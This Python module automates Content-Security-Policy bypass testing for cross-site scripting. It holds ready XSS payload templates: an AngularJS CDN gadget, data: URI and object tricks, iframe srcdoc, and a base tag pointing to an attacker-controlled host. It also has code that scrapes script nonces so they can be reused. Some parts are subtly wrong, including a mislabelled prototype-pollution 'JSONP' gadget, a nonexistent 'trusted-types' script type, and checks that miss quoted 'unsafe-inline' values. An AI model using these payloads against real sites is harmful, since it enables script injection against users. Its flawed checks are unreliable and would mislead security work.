"""
Advanced CSP bypass automation module.
Detects and tests Content-Security-Policy bypass techniques.
"""

import re
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass
from enum import Enum


class CSPDirective(Enum):
    """CSP directives relevant to XSS."""
    SCRIPT_SRC = "script-src"
    DEFAULT_SRC = "default-src"
    STYLE_SRC = "style-src"
    IMG_SRC = "img-src"
    CONNECT_SRC = "connect-src"
    OBJECT_SRC = "object-src"
    FRAME_SRC = "frame-src"
    BASE_URI = "base-uri"
    FORM_ACTION = "form-action"
    REPORT_URI = "report-uri"
    REPORT_TO = "report-to"


@dataclass
class CSPBypass:
    """CSP bypass technique."""
    technique: str
    payload_template: str
    description: str
    target_directive: CSPDirective
    confidence: float


class CSPBypassAutomator:
    """
    CSP bypass automation.
    Detects and tests CSP bypass techniques for various bypass vectors.
    """

    # Common CSP bypass techniques
    BYPASS_TECHNIQUES = [
        CSPBypass(
            technique="data_uri",
            payload_template='data:text/javascript,{m}',
            description="data: URI script execution",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.8
        ),
        CSPBypass(
            technique="json_gadget",
            payload_template='{"__proto__":{m}}',
            description="JSONP gadget via data URI",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.7
        ),
        CSPBypass(
            technique="trusted_types_bypass",
            payload_template='<script type="trusted-types">{m}</script>',
            description="Trusted Types directive bypass",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.6
        ),
        CSPBypass(
            technique="nonce_prediction",
            payload_template='<script nonce="{nonce}">{m}</script>',
            description="Nonce prediction attack",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.5
        ),
        CSPBypass(
            technique="hash_source_bypass",
            payload_template='<script src="{m}#sha256-abc..."></script>',
            description="Hash source bypass",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.4
        ),
        CSPBypass(
            technique="angular_cdn",
            payload_template='<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.min.js"></script><div ng-app ng-csp>{m}</div>',
            description="Angular CSP bypass via CDN",
            target_directive=CSPDirective.SCRIPT_SRC,
            confidence=0.9
        ),
        CSPBypass(
            technique="base_tag_injection",
            payload_template='<base href="https://attacker.tld/">',
            description="Base tag injection for script loading",
            target_directive=CSPDirective.BASE_URI,
            confidence=0.8
        ),
        CSPBypass(
            technique="iframe_sandbox",
            payload_template='<iframe sandbox="allow-scripts" srcdoc="{m}"></iframe>',
            description="iframe sandbox bypass",
            target_directive=CSPDirective.FRAME_SRC,
            confidence=0.7
        ),
        CSPBypass(
            technique="object_data",
            payload_template='<object data="data:text/html,{m}"></object>',
            description="Object data URI bypass",
            target_directive=CSPDirective.OBJECT_SRC,
            confidence=0.8
        ),
        CSPBypass(
            technique="style_attribute",
            payload_template='<div style="background:url({m})"></div>',
            description="Style attribute injection",
            target_directive=CSPDirective.STYLE_SRC,
            confidence=0.6
        ),
    ]

    def __init__(self):
        self._detected_bypasses: List[CSPBypass] = []

    def parse_csp(self, csp_header: str) -> Dict[CSPDirective, List[str]]:
        """
        Parse Content-Security-Policy header.

        Args:
            csp_header: CSP header value

        Returns:
            Dictionary mapping directives to their values
        """
        csp = {}

        if not csp_header:
            return csp

        directives = csp_header.split(';')

        for directive in directives:
            directive = directive.strip()
            if not directive:
                continue

            parts = directive.split()
            if len(parts) < 1:
                continue

            directive_name = parts[0].lower()

            try:
                directive_enum = CSPDirective(directive_name)
                csp[directive_enum] = parts[1:] if len(parts) > 1 else ['*']
            except ValueError:
                # Unknown directive, skip
                pass

        return csp

    def analyze_weaknesses(self, csp: Dict[CSPDirective, List[str]]) -> List[str]:
        """
        Analyze CSP for weaknesses.

        Args:
            csp: Parsed CSP dictionary

        Returns:
            List of weakness descriptions
        """
        weaknesses = []

        # Check for unsafe-inline
        script_src = csp.get(CSPDirective.SCRIPT_SRC, [])
        if 'unsafe-inline' in script_src:
            weaknesses.append("script-src allows unsafe-inline")

        # Check for unsafe-eval
        if 'unsafe-eval' in script_src:
            weaknesses.append("script-src allows unsafe-eval")

        # Check for wildcard in script-src
        if '*' in script_src:
            weaknesses.append("script-src allows wildcard (*)")

        # Check for missing script-src (falls back to default-src)
        if CSPDirective.SCRIPT_SRC not in csp:
            default_src = csp.get(CSPDirective.DEFAULT_SRC, [])
            if '*' in default_src:
                weaknesses.append("No script-src directive, falls back to permissive default-src")

        # Check for missing object-src
        if CSPDirective.OBJECT_SRC not in csp:
            weaknesses.append("No object-src directive, object/embed may execute")

        # Check for report-uri (legacy)
        if CSPDirective.REPORT_URI in csp:
            weaknesses.append("Legacy report-uri directive present (may be XSS vector)")

        return weaknesses

    def get_applicable_bypasses(
        self,
        csp: Dict[CSPDirective, List[str]],
        marker: str = "xoxss",
    ) -> List[CSPBypass]:
        """
        Get applicable CSP bypass techniques based on the CSP.

        Args:
            csp: Parsed CSP dictionary
            marker: Unique marker for testing

        Returns:
            List of applicable bypass techniques
        """
        applicable = []

        script_src = csp.get(CSPDirective.SCRIPT_SRC, [])
        default_src = csp.get(CSPDirective.DEFAULT_SRC, [])

        for bypass in self.BYPASS_TECHNIQUES:
            # Check if the target directive allows the bypass
            target_directive = bypass.target_directive
            values = csp.get(target_directive, default_src)

            # Skip if directive is missing (CSP not set)
            if not values:
                continue

            # Check if wildcard allows it
            if '*' in values:
                applicable.append(bypass)
                continue

            # Check for specific bypass conditions
            if bypass.technique == "data_uri" and 'data:' in values:
                applicable.append(bypass)
            elif bypass.technique == "angular_cdn" and any('ajax.googleapis.com' in v for v in values):
                applicable.append(bypass)
            elif bypass.technique == "iframe_sandbox" and any('sandbox' in v for v in values):
                applicable.append(bypass)

        return applicable

    def generate_bypass_payloads(
        self,
        bypasses: List[CSPBypass],
        marker: str,
        nonce: Optional[str] = None
    ) -> List[str]:
        """
        Generate XSS payloads for CSP bypass techniques.

        Args:
            bypasses: List of applicable bypass techniques
            marker: Unique marker
            nonce: Optional nonce for nonce-based bypass

        Returns:
            List of XSS payloads
        """
        payloads = []

        for bypass in bypasses:
            payload = bypass.payload_template.replace("{m}", marker)
            if nonce and "{nonce}" in payload:
                payload = payload.replace("{nonce}", nonce)
            payloads.append(payload)

        return payloads

    def test_nonce_prediction(self, html_content: str) -> Optional[str]:
        """
        Attempt to predict or extract nonce from HTML.

        Args:
            html_content: HTML content

        Returns:
            Predicted nonce or None
        """
        # Look for nonce attributes
        patterns = [
            r'nonce\s*=\s*["\']([^"\']+)["\']',
            r'<script[^>]*nonce=([a-zA-Z0-9+/=]+)',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, html_content)
            if matches:
                return matches[0]

        return None

    def generate_csp_report(self, csp: Dict[CSPDirective, List[str]]) -> str:
        """Generate a human-readable CSP report."""
        report = ["Content-Security-Policy Analysis", ""]

        for directive, values in csp.items():
            report.append(f"{directive.value}: {', '.join(values)}")

        return "\n".join(report)
